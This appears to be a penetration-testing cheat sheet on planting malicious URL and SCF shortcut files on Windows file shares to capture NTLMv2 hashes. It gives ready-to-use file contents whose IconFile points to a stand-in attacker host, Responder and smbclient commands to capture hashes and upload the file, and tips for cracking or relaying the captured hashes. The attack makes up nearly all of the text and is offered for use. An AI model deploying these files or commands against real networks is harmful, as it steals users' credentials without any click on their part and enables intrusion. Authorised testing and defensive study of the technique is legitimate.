# URL File Attacks

Drop a malicious URL or SCF file on a file share to capture NTLMv2 hashes from anyone who browses the share.

## How It Works

- Windows automatically tries to load icons referenced in URL/SCF files
- If the icon path points to your attacker machine, the user's hash is sent
- The user just has to browse the folder -- no clicking required

## Creating a Malicious File

### URL File

Create `@Shortcut.url` (the `@` makes it sort to the top):

```
[InternetShortcut]
URL=http://ATTACKER_IP
IconIndex=0
IconFile=\\ATTACKER_IP\share\icon.ico
```

### SCF File

Create `@Shortcut.scf`:

```
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

## Attack Steps

1. Start Responder to capture hashes:

```bash
sudo responder -I tun0 -dw
```

2. Place the file on a writable share:

```bash
smbclient //TARGET_IP/share -U 'DOMAIN/username'
put @Shortcut.url
```

3. Wait for users to browse the share
4. Crack or relay captured hashes

## Notes

- Use with Responder or ntlmrelayx
- Name files with `@` prefix so they sort to the top of directory listings
- Works well on shared drives that users access regularly
- SCF files may be blocked by newer Windows versions
